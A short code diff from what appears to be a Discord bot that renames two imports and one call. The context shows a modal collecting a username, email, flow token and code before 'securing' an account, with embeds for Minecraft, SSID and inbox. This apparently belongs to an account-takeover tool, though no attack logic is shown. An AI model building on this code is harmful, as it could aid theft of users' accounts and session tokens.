@@ -9,8 +9,8 @@ from ui.buttons.embed_buttons import ButtonOptions
 from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
-from auth.initialSession import getSession
-from shared.sendLogs import sendLogs
+from auth.initial_session import get_session
+from shared.send_logs import sendLogs
 
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
@@ -76,7 +76,7 @@ class MyModalTwo(ui.Modal):
             ephemeral = True
         )
 
-        self.session = getSession()
+        self.session = get_session()
 
         # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
         securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
